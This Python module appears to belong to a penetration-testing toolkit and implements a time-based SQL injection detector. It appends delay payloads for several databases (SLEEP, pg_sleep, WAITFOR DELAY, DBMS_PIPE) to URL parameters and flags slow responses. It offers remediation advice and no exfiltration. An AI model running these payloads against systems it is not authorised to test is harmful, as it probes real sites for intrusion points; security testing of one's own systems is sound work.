#!/usr/bin/env python3
"""
NEXUS-STRIKE — SQL Injection Detector (Time-Based)
==================================================
Safe, read-only detection. Sends time-delay payloads and compares
response times. No data exfiltration. No destructive operations.

Works against any target you own. Only sends GET/POST requests with
crafted parameter values and measures elapsed time.

Usage (standalone):
    python -m nexus.tools.webapp.sqli --target "http://localhost:8080/login?user=admin"
    python -m nexus.tools.webapp.sqli --target "http://localhost:8080/search?q=test" --param q

Usage (via registry):
    from nexus.tools.webapp.sqli import run
    result = run(target="http://localhost:8080/login?user=admin")
"""

import sys
import time
import argparse
import urllib.parse
from typing import Optional

try:
    import requests
except ImportError:
    requests = None

from nexus.tools.registry import tool_registry

# ── Configuration ──────────────────────────────────────────────────────────

# Time-delay payloads for different DB backends.
# Each tuple: (db_name, payload_suffix, expected_delay_seconds)
TIME_DELAY_PAYLOADS = [
    ("MySQL", "'; SELECT SLEEP(3)--", 3),
    ("MySQL", "' AND SLEEP(3)--", 3),
    ("PostgreSQL", "'; SELECT pg_sleep(3)--", 3),
    ("PostgreSQL", "' AND pg_sleep(3)--", 3),
    ("SQLServer", "'; WAITFOR DELAY '0:0:3'--", 3),
    ("SQLServer", "' AND WAITFOR DELAY '0:0:3'--", 3),
    ("Oracle", "'; SELECT DBMS_PIPE.RECEIVE_MESSAGE('x',3)--", 3),
    ("SQLite", "'; SELECT randomblob(100000000)--", 3),
]

# If the delay payload response is this many seconds longer than baseline,
# we flag the parameter as vulnerable.
DELAY_THRESHOLD = 2.0  # seconds
REQUEST_TIMEOUT = 15   # seconds per request
MAX_PARAMS = 10        # safety limit to avoid hammering


# ── HTTP helpers ───────────────────────────────────────────────────────────

def _send_request(url, method="GET", params=None, data=None,
                  headers=None, timeout=REQUEST_TIMEOUT):
    """Send an HTTP request and return (response, elapsed_time)."""
    if requests is None:
        return None, 0.0
    try:
        start = time.time()
        if method.upper() == "GET":
            resp = requests.get(url, params=params, headers=headers, timeout=timeout)
        elif method.upper() == "POST":
            resp = requests.post(url, data=data, headers=headers, timeout=timeout)
        else:
            resp = requests.request(method, url, params=params, data=data,
                                    headers=headers, timeout=timeout)
        elapsed = time.time() - start
        return resp, elapsed
    except requests.exceptions.Timeout:
        return None, float(timeout)
    except Exception:
        return None, 0.0


def _extract_params(url):
    """Extract query-string parameters from a URL."""
    parsed = urllib.parse.urlparse(url)
    query_params = urllib.parse.parse_qs(parsed.query)
    return {k: v[0] if v else "" for k, v in query_params.items()}


def _build_url_with_param(url, param_name, param_value):
    """Return a copy of *url* with *param_name* set to *param_value*."""
    parsed = urllib.parse.urlparse(url)
    query_dict = urllib.parse.parse_qs(parsed.query)
    query_dict[param_name] = [param_value]
    new_query = urllib.parse.urlencode(query_dict, doseq=True)
    return urllib.parse.urlunparse(parsed._replace(query=new_query))


# ── Core detection logic ───────────────────────────────────────────────────

def _test_param(url, param_name, param_value, method="GET", headers=None):
    """
    Test a single parameter for time-based SQLi.

    Returns a list of finding dicts (empty if not vulnerable).
    """
    findings = []

    # ── Baseline request (original value) ──
    baseline_url = _build_url_with_param(url, param_name, param_value)
    _, baseline_time = _send_request(baseline_url, method=method, headers=headers)
    if baseline_time == 0:
        return findings  # request failed entirely

    # ── Test each time-delay payload ──
    for db_type, payload, expected_delay in TIME_DELAY_PAYLOADS:
        test_value = param_value + payload
        test_url = _build_url_with_param(url, param_name, test_value)

        _, payload_time = _send_request(test_url, method=method, headers=headers)
        if payload_time == 0:
            continue  # request failed, try next payload

        actual_delay = payload_time - baseline_time
        if actual_delay >= DELAY_THRESHOLD:
            findings.append({
                "type": "time_based_sqli",
                "parameter": param_name,
                "database": db_type,
                "payload": payload,
                "baseline_time": round(baseline_time, 3),
                "payload_time": round(payload_time, 3),
                "delay": round(actual_delay, 3),
                "severity": "HIGH",
                "description": (
                    f"Time-based SQLi confirmed on parameter '{param_name}' "
                    f"({db_type} payload). Response delayed by {actual_delay:.1f}s "
                    f"(baseline: {baseline_time:.3f}s, payload: {payload_time:.3f}s)."
                ),
                "remediation": (
                    "Use parameterized queries / prepared statements. "
                    "Validate and sanitize all user input. "
                    "Apply least-privilege database permissions."
                ),
            })
            break  # found a match — no need to try more payloads

    return findings


# ── Public API ─────────────────────────────────────────────────────────────

def run(target: str, **kwargs) -> dict:
    """
    Run time-based SQL injection detection against a target URL.

    Args:
        target: Target URL with query parameters
                (e.g., "http://localhost:8080/login?user=admin")
        **kwargs:
            param  – test only this parameter (str)
            method – HTTP method, "GET" or "POST" (default: "GET")
            headers – optional dict of HTTP headers

    Returns:
        dict with keys: tool, domain, target, status, findings, metadata
    """
    if not target:
        return {
            "tool": "webapp.sqli",
            "domain": "webapp",
            "target": target,
            "status": "completed",
            "findings": [],
            "error": "No target URL provided.",
        }

    if requests is None:
        return {
            "tool": "webapp.sqli",
            "domain": "webapp",
            "target": target,
            "status": "completed",
            "findings": [],
            "error": "The 'requests' library is not installed. Run: pip install requests",
        }

    # ── Parse kwargs ──
    param_filter = kwargs.get("param")
    method = kwargs.get("method", "GET").upper()
    headers = kwargs.get("headers", {"User-Agent": "NexusStrike/1.0"})

    # ── Extract parameters from URL ──
    params = _extract_params(target)

    if not params:
        return {
            "tool": "webapp.sqli",
            "domain": "webapp",
            "target": target,
            "status": "completed",
            "findings": [],
            "error": (
                "No query parameters found in target URL. "
                "Provide a URL with parameters, e.g.: "
                "http://localhost:8080/page?id=1"
            ),
        }

    # ── Filter to specific parameter if requested ──
    if param_filter:
        params = {k: v for k, v in params.items() if k == param_filter}
        if not params:
            return {
                "tool": "webapp.sqli",
                "domain": "webapp",
                "target": target,
                "status": "completed",
                "findings": [],
                "error": f"Parameter '{param_filter}' not found in target URL.",
            }

    # ── Limit number of params to test ──
    if len(params) > MAX_PARAMS:
        params = dict(list(params.items())[:MAX_PARAMS])

    # ── Test each parameter ──
    all_findings = []
    tested_params = []

    for param_name, param_value in params.items():
        tested_params.append(param_name)
        param_findings = _test_param(target, param_name, param_value,
                                     method=method, headers=headers)
        all_findings.extend(param_findings)

    # ── Format findings for the LLM report ──
    formatted_findings = []
    for f in all_findings:
        formatted_findings.append(
            f"[{f['severity']}] Time-based SQLi on parameter '{f['parameter']}' "
            f"({f['database']}): {f['description']}"
        )

    return {
        "tool": "webapp.sqli",
        "domain": "webapp",
        "target": target,
        "status": "completed",
        "findings": formatted_findings,
        "metadata": {
            "tested_parameters": tested_params,
            "vulnerable_parameters": [f["parameter"] for f in all_findings],
            "payloads_tested": len(TIME_DELAY_PAYLOADS),
            "delay_threshold": DELAY_THRESHOLD,
            "method": method,
        },
        "raw_findings": all_findings,
    }


# ── Standalone CLI ─────────────────────────────────────────────────────────

def _main():
    parser = argparse.ArgumentParser(
        description="NEXUS-STRIKE — Time-based SQL Injection Detector"
    )
    parser.add_argument("--target", "-t", required=True,
                        help="Target URL with query parameters "
                             "(e.g., http://localhost:8080/login?user=admin)")
    parser.add_argument("--param", "-p", default=None,
                        help="Test only this parameter (default: test all)")
    parser.add_argument("--method", "-m", default="GET", choices=["GET", "POST"],
                        help="HTTP method (default: GET)")
    args = parser.parse_args()

    print(f"\n[*] SQLi Detector — Target: {args.target}")
    print(f"[*] Method: {args.method}")
    if args.param:
        print(f"[*] Parameter filter: {args.param}")
    print(f"[*] Payloads: {len(TIME_DELAY_PAYLOADS)} | "
          f"Delay threshold: {DELAY_THRESHOLD}s\n")

    result = run(target=args.target, param=args.param, method=args.method)

    if result.get("error"):
        print(f"[-] Error: {result['error']}")
        sys.exit(1)

    if result["findings"]:
        print(f"[+] VULNERABLE — {len(result['findings'])} finding(s):\n")
        for f in result["findings"]:
            print(f"  {f}\n")
    else:
        print("[+] No SQL injection detected (all parameters passed time-based test).")

    meta = result.get("metadata", {})
    print(f"\n[*] Summary:")
    print(f"  Tested parameters : {meta.get('tested_parameters', [])}")
    print(f"  Vulnerable params : {meta.get('vulnerable_parameters', [])}")
    print(f"  Payloads per param: {meta.get('payloads_tested', 0)}")


if __name__ == "__main__":
    _main()


# ── Register with tool registry ────────────────────────────────────────────

tool_registry.register("webapp.sqli", run, metadata={
    "name": "webapp.sqli",
    "domain": "webapp",
    "status": "completed",
    "description": "Time-based SQL injection detector (read-only, safe)",
    "parameters": {
        "target": "Target URL with query parameters",
        "param": "Specific parameter to test (optional)",
        "method": "HTTP method: GET or POST (default: GET)",
        "headers": "Optional HTTP headers dict",
    },
})
